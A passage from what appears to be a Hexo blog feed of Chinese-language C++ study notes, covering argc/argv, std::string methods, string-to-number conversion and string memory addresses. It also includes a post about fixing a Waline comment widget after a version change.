可以是ping网址也可以pingIP地址，但是这俩参数都是不确定的，并且还有一些其他功能-t 持续ping之类的，这些都是不确定的。</p><p>在老的编译器那会，创建模板的时候main函数括号里是有两个形参的，这好像也是c语言规定的主函数的形参就俩</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * argc表示命令行的参数个数</span></span><br><span class="line"><span class="comment">     * argv表示有argc搁参数，[0]是以程序名开始，随后每多一个参数就一一匹配上。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不好理解的可以直接写段代码看看：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;argc=&quot;</span> &lt;&lt; argc &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)&#123;</span><br><span class="line">        std::cout &lt;&lt; argv[i] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/27/function/005.png" class=""><p>右击main函数打开所在文件夹，然后找到Debug目录下，不用看x64，如果你是x64编译的就去找x64下的debug。<br>进去之后看到这个项目名.exe程序，右击文件夹空白地方打开终端：</p><img src="/2022/05/27/function/006.png" class=""><p><code>.\执行程序 参数1 参数2 ......</code>参照这样执行，我记得这好像叫重定向。</p><blockquote><p>ps:之前linux玩多了，linux下执行的时候都是.&#x2F;xxx，而windows则相反.\可还行</p></blockquote><p><strong>然后印象里当初弄的时候好像第一个接受的参数应该是这个程序编译后的名称，但这里是显示一段较为完整的路径了，暂时没研究为什么，可能是不是在全局命令下执行的吧，就自然而然的带上了路径+执行程序名称</strong></p><p>argv就像一个数组制作的字符串，输入的参数会分配到一片连续的空间，并且以0结尾。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>函数的模板其实没啥好写的，用着用着就习惯了</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>string2</title>
      <link href="/2022/05/26/string2/"/>
      <url>/2022/05/26/string2/</url>
      
        <content type="html"><![CDATA[<h1 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h1><p>自认为不是一个努力的人……虽然这些20年在b站看过黑马的教程，甚至当时在本地也写过md的文件哈哈哈哈但是一段时间不用又落下了许多，也好在没有忘得一干二净吧……看到都能想起来，只是一些内置的方法会记不太清。回看也是两天看一点看一点，加上看视频又得自己做，然后顺便写在博客上，进度确实会慢一些。<br>而且数据结构这一门快打工了也还没掌握……还是很惭愧的,后面要尽量补齐了。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也回顾了string的一些方法，然后小结一下string</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>字符串之中除了指针，编码是一个无时不刻不会头疼的问题。<br>字符从存储：由表面的字符到计算机上的编码表，再到底层转换成二进制<br>读取字符串的顺序是存储的逆向顺序。</p><blockquote><p>常见的编码表：utf-8、utf-16、GBK、ASCII等</p></blockquote><hr><h2 id="自制能统计带中文的字符串"><a href="#自制能统计带中文的字符串" class="headerlink" title="自制能统计带中文的字符串"></a>自制能统计带中文的字符串</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (*ch &lt; <span class="number">0</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">*ch++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是之前string回顾的时候做的一个小题目，因为gbk的情况下，中文占用两个字节，所以判断起来不一样。<br>代码目前不重要，重要的是一点，为什么要<code>*ch &lt; 0</code>。</p><p>1字节的范围是-128 - 127，如果是无符号就是0-255。<br>那么现在没有指定是无符号，所以按照-128 - 127算。<br>而ascii码的范围就是0-127，超过的就代表不是英文字符，且现在是有符号类型，所以是判断这个字符是不是&lt; 0，如果小于0就说明这个字符是中文；如果是无符号类型，就是判断这个字符是不是&gt; 127，如果大于127就说明这个字符是中文。</p><p>比如说<code>d5 c5</code>是中文张在gbk下的十六进制表现<br>d5拆分成二进制<code>1101 0101</code>,按照三码的规范，这其实就是个负数，那么在占用两个字节的前提下，读到一个字节十进制小于0，就可以跳过一个字节读了，也就是上述代码的写法。</p><p>当然也可用for循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; ch[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ch[i] &lt; <span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>string那会有个把数字转换成字符串的方法<code>std::to_string(number)</code>;<br>对应的也就产生了将字符串转化成数字</p><table><thead><tr><th>作用</th><th>语法</th><th>用法</th></tr></thead><tbody><tr><td>str转换成int</td><td>std::stoi(string)</td><td>int a &#x3D; stoi(“123”);</td></tr><tr><td>str转换成long</td><td>std::stol(string)</td><td>long a &#x3D; stol(“123”);</td></tr><tr><td>str转换成long long</td><td>std::stoll(string)</td><td>long long a &#x3D; stoll(“123”);</td></tr><tr><td>str转换成unsigned long</td><td>std::stoul(string)</td><td>unsigned long a &#x3D; stoul(“123”)</td></tr><tr><td>str转换成unsigned long long</td><td>std::stoull(string)</td><td>unsigned long long a &#x3D; stoull(“123”);</td></tr><tr><td>str转换成float</td><td>stof(string)</td><td>float a &#x3D; stof(“123”);</td></tr><tr><td>str转换成double</td><td>stod(string)</td><td>double a &#x3D; stod(“123”);</td></tr><tr><td>str转换成long double</td><td>stold(string)</td><td>long double a &#x3D; stold(“123”)</td></tr></tbody></table><blockquote><p>也是有规律的，sto+转换成的类型首字符</p></blockquote><hr><h2 id="stringstream流"><a href="#stringstream流" class="headerlink" title="stringstream流"></a>stringstream流</h2><p>在没有声明命名空间的时候，输入输出都是通过std::操作<br>在头文件sstream中有这么古怪玩意。。<code>std::stringstream</code><br><code>.str()会返回一个string</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::stringstream str;</span><br><span class="line">str &lt;&lt; <span class="string">&quot;hello &quot;</span> &lt;&lt; <span class="string">&quot;world&quot;</span>;</span><br><span class="line">std::string str1 = str.<span class="built_in">str</span>();</span><br></pre></td></tr></table></figure><p>打印str1的结果就是<code>hello world</code>;</p><blockquote><p>这个单独的string流感觉用的也少吧，毕竟代码需要可阅读性，大家都用的会更直观</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>无感-</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointerString</title>
      <link href="/2022/05/26/pointerString/"/>
      <url>/2022/05/26/pointerString/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>C语言的字符串是通过数组实现的，数组本质上又和指针无二。<br>那么cpp的字符串底层是否跟C语言一致</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><p>在C语言里，ch现在就&#x3D; ch[0]; 象征着数组首地址。<br>但是string的构造我们还不清楚，所以通过编译器查看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;str &lt;&lt; <span class="string">&quot;\n&quot;</span> &lt;&lt; &amp;str[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本想通过这样直接输出的，但是cout好像优化掉了<code>&amp;str[0]</code>，得到的还是整个字符串的值。<br>那就粗暴点用C语言的printf指定格式输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>结果是地址不同：<img src="/2022/05/26/pointerString/000.png" class=""></p><blockquote><p>其实使用string的时候需要引入头文件就该知道string不简单，它也属于容器的一种，底层是通过类实现的。</p></blockquote><p>再往后查看str[1]的地址：<img src="/2022/05/26/pointerString/001.png" class=""><br>发现str[0]和[1]直接相差1个字节，这才符合数组是由一个个char组成的。</p><hr><p>其次我们知道C语言的字符串长度是固定的，只有动态数组才能扩容，或者说合并数组时候需要用到一块新的内存空间，string虽然有重载的办法，但是底层也是八九不离十</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">str += <span class="string">&quot;! buhaolebuhaole&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给str扩容，看看地址会不会发生改变</p><img src="/2022/05/26/pointerString/002.png" class=""><p>发现只有这个所谓的str首地址没有改变，剩下的0和1都变了，且幅度有点大，有点跟我们之前比较栈区和堆区之间地址的差异。</p><hr><p>如果就只想看到字符串那一块的内存，可以使用c++11标准提供的两个函数</p><ul><li>.c_str()  得到一个const char*的指针，指向字符串的内存空间</li><li>.data()   得到一个const char*的指针，指向字符串的内存空间</li></ul><p>这么一看这俩方法好像是重复的，没有啥特别意义，所以在c++17标准之后统一了，只不过返回的只是个指针而不是常量指针了。</p><p>c++ 17标准</p><ul><li>.data() 得到的是个char*的指针了</li></ul><p>当我们定义一个常量指针接受str.c_str()时：</p><img src="/2022/05/26/pointerString/003.png" class=""><p>能看到cs指向的地址和str[0]是一致的。</p><blockquote><p>虽然.c_str()返回的是常量指针，但是如果我们想修改，还是可以通过强制转换实现，但是这种限定是很有必要的。个人没必要闲的蛋疼去玩。</p></blockquote><p><strong>且早期的之后string不要求数组以0结尾，因为string内置累加器，会自动记录长度，通过调用length方法获取。不像C语言的时候要区分strlen和sizeof的区别。但c++11之后还是要求了string也要以0结尾</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>主要就是区分string底层和char[]存在一定区别</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>waline更新缓存错误</title>
      <link href="/2022/05/26/walineError/"/>
      <url>/2022/05/26/walineError/</url>
      
        <content type="html"><![CDATA[<h1 id="整活"><a href="#整活" class="headerlink" title="整活"></a>整活</h1><p>预览的时候发现评论突然挂了</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/05/26/walineError/000.png" class=""><blockquote><p>说我的Waline未定义。。。我寻思我js文件都是用的官方模板怎么就没定义了。。<br>又上了一趟<code>vercel.com</code>发现也是一样控制台都是报错<code>Waline is not defined</code></p></blockquote><blockquote><p>就很离谱啊。。。但是waline官网的看着又是正常的，就只能上github看看有没有什么类似的情况<br>结果倒是有一个说clintv2不稳定的问题</p></blockquote><img src="/2022/05/26/walineError/001.png" class=""><blockquote><p>逆天。。上一秒waline的文档里面script还是cdn的地址<br>刷新一下又变成unpkg了</p></blockquote><img src="/2022/05/26/walineError/003.png" class=""><blockquote><p>主要是相比之前的我记得好像多了个这个link，然后其他版本以前也是没写的，这次都是@v2了。。很莫名其妙啊，要我说改动就不能大改。。或者好歹发邮件提示一下。</p></blockquote><blockquote><p>修改了下我这个主题的ejs文件之后</p></blockquote><img src="/2022/05/26/walineError/002.png" class=""><blockquote><p>评论是能看到了，版本直接跳到2.5.1了，但是之前评论的头像显示不出来控制台报错<code>net::ERR_CONNECTION_TIMED_OUT</code>….真是逆天。<br>但是官网文档的好像是2.5.2。。。就很迷惑行为。<br>而且我这里只能修改本地的配置，我在vercel那里还是访问不了，提示版本有问题未定义。。哎麻了</p></blockquote><blockquote><p>但是突然想起来vercel能重新部署，就试了一下</p></blockquote><img src="/2022/05/26/walineError/004.png" class=""><blockquote><p>找到这里点击那三个点，选择重新部署</p></blockquote><blockquote><p>重新部署要等一段时间，等待之后发现测试的地方能用了</p></blockquote><img src="/2022/05/26/walineError/006.png" class=""><blockquote><p>虽然控制台那里显示的server版本好像还是1.18.5</p></blockquote><img src="/2022/05/26/walineError/007.png" class=""><blockquote><p>在源代码那里也发现了应该是根据walineserver更新了，之前const waline &#x3D; Waline才报的错，现在是变成Waline.init了</p></blockquote><img src="/2022/05/26/walineError/008.png" class=""><blockquote><p>回到之前的评论下发现头像也出来了，甚至还多了个ip归属地。。。可还行</p></blockquote><img src="/2022/05/26/walineError/005.png" class=""><blockquote><p>只不过waline的版本还是2.5.1，官网的2.5.2都不知道是不是测试版的问题了。这一个小版本号倒是问题不大</p></blockquote><img src="/2022/05/26/walineError/009.png" class=""><blockquote><p>当你是管理员登录评论系统的时候你会发现能看到的好像更多了,还多了操作权限</p></blockquote><img src="/2022/05/26/walineError/010.png" class=""><blockquote><p>不信邪又去官网刷新了一下他的版本又变成1.6.1了？？？？？？合着我是撞他枪口上更新了？？？？</p></blockquote><img src="/2022/05/26/walineError/011.png" class=""><blockquote><p>快速上手那里也变了。。。。连最近编辑时间都改了可还行。。。</p></blockquote><img src="/2022/05/26/walineError/012.png" class=""><p>让我反复刷新一下。。。奶奶个腿他真的是大晚上更新啊</p><img src="/2022/05/26/walineError/013.png" class=""><p>这编辑时间又特么改成5.25日18点了，。。。我26号一点刷来刷去编辑时间写25日的6点</p><p>哎反正先不管了。hexo s本地能预览成功就行。</p><hr><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>去github上提交了下问题</p><img src="/2022/05/26/walineError/014.png" class=""><p>按照作者的说法是官网文档本地缓存的问题。。。这倒也不是啥大事就是大改了自己要多留意，毕竟还是个有人 维护的项目。<br>下面那老哥，回答的都不知道啥。。。之前都用的jsdelivr，你跟我说自己的cdn缓存持久。。。再说了之前用的时候也没刻意在script里@v2</p><blockquote><p>所以魔改主题是有这个问题，还得是等作者更新接口比较实在，自己弄的太麻烦。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最近写的都存在本地了，网页的等哪天想上传仓库了再说吧。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> themes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>string1</title>
      <link href="/2022/05/24/string1/"/>
      <url>/2022/05/24/string1/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>std:string</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>回忆过C语言版的字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[] = <span class="string">&quot;abafjiafajif&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">10</span>] = <span class="string">&quot;aaaaaaaa&quot;</span>;</span><br></pre></td></tr></table></figure><p>大致上一个意思，限定长度和不限定长度，不限定长度会自动根据初始化的值长度而定义。</p><p>其次就是拼接两个字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[<span class="number">10</span>] = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch1[<span class="number">10</span>] = <span class="string">&quot;5678&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(ch2, ch, <span class="built_in">strlen</span>(ch));    <span class="comment">//先将ch从头拷贝进来</span></span><br><span class="line"><span class="built_in">memcpy</span>(ch2 + <span class="built_in">strlen</span>(ch), ch1, <span class="built_in">strlen</span>(ch1) + <span class="number">1</span>); <span class="comment">//在由从ch拷贝到ch2里</span></span><br></pre></td></tr></table></figure><p>这样拼接起来还是挺麻烦的，如果能直接相加赋给字符串就会相对方便了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用string关键字前需包含头文件string，此外如果不想老是写std::string，就在下面加一句<code>using std::string;</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>定义起来格式就跟正常变量一样。输入输出相较于C语言类型的字符串的好处就是，不用提前声明大小，不用担心随便溢出。</p><p>此外string还可以指定只接受字符串的一部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str&#123; <span class="string">&quot;hello world&quot;</span> , <span class="number">5</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/000.png" class=""><p>除了从0开始，还能自定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = &#123; <span class="string">&quot;hello world&quot;</span> , <span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/001.png" class=""><p>能从指定的字符串获取，也就能从变量获取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">std::cin &gt;&gt; str;</span><br><span class="line">string str1 = &#123; str,<span class="number">2</span>,<span class="number">5</span> &#125;;</span><br><span class="line">std::cout &lt;&lt; str1 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/002.png" class=""><p><strong>像比较之下方便了许多，但是这其实也就是官方封装好的，自己也能实现类似的效果</strong></p><blockquote><p>ps:对中文支持一般，因为字符集的不确定性，不能保证不同占用下带来的问题</p></blockquote><p>还有一种比较无聊的写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">str</span><span class="params">(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>就是赋值了6个’a’组成的字符串。</p><p>然后回到拼接字符串，string可以直接通过相加实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">string str1;</span><br><span class="line">str1 = str + <span class="string">&quot;5678&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/003.png" class=""><p>效果也是ok的。</p><blockquote><p>当然要求+的时候都是字符串，不能是字符串以外的东西</p></blockquote><p>如果想加一串数字，那也只能先将其转换成字符串。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="built_in">to_string</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>这样得到的str就是<code>“123”</code>，一个字符串类型的变量。</p><img src="/2022/05/24/string1/004.png" class=""><p>当然数字不单只是整型的，小数也可以。</p><hr><h2 id="加强"><a href="#加强" class="headerlink" title="加强"></a>加强</h2><p>字符串拼接存在一个问题，那就是参数不能都是常量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = <span class="string">&quot;123&quot;</span> + <span class="string">&quot;456&quot;</span>;</span><br></pre></td></tr></table></figure><p>这种情况下就会报错，原因是这两个常量“123”和“456”在计算机里还是char类型的<br>解决办法可以创建临时变量或者强转</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = (string)<span class="string">&quot;123&quot;</span> + <span class="string">&quot;456&quot;</span>; <span class="comment">//强制转换</span></span><br><span class="line">str = string&#123;<span class="string">&quot;123&quot;</span>&#125; + <span class="string">&quot;456&quot;</span>; <span class="comment">//创建临时string的变量</span></span><br></pre></td></tr></table></figure><p>如果使用<code>+=</code>操作符，那么也要注意类型转换，因为+的优先级高于+&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = string&#123; <span class="string">&quot;123&quot;</span> &#125; + <span class="string">&quot;456&quot;</span> + <span class="string">&quot;789&quot;</span>;</span><br><span class="line">str += (string)<span class="string">&quot;hhh&quot;</span> + <span class="string">&quot;aaa&quot;</span>;   <span class="comment">//保持强制转换或者创建临时变量</span></span><br></pre></td></tr></table></figure><hr><h3 id="append"><a href="#append" class="headerlink" title="append"></a>append</h3><p>之前的拼接都是使用+号，还得额外创建一个变量，string本身提供了一种方法就是<code>append</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">str.<span class="built_in">append</span>(<span class="string">&quot;456&quot;</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>同时append可以套娃<code>str.append(&quot;123&quot;).append(&quot;456&quot;).append(&quot;789&quot;).....</code><br>也可以截取<code>str.append(&quot;123456&quot;,3)</code>或者<code>str.append(&quot;123456&quot;,2,5)</code><br>也可以使用定义时的办法<code>str.append(6,&#39;a&#39;)</code></p><img src="/2022/05/24/string1/005.png" class=""><p>抛开使用中的一种，也就意味着append有七种参数方法。</p><hr><h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><p>字符串的截取方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">substr</span>(index,end); <span class="comment">//输入截取的起点和终点</span></span><br><span class="line">.<span class="built_in">substr</span>(index);     <span class="comment">//只输入一个数则表示截取起点，默认截取到最后</span></span><br></pre></td></tr></table></figure><p>substr会有一个返回值，返回的值就是截取后的字符串，可以用于赋值给其他字符串或者直接打印</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;0123456789&quot;</span>;</span><br><span class="line">string str1 = str.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">std::cout &lt;&lt; str.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">5</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; str1 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>效果就是：<img src="/2022/05/24/string1/006.png" class=""></p><hr><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>C语言我们计算字符串长度使用<code>strlen</code>,cpp的string则也有计算长度的方法<code>length</code></p><figure class="highlight cpp"><table><tr><td 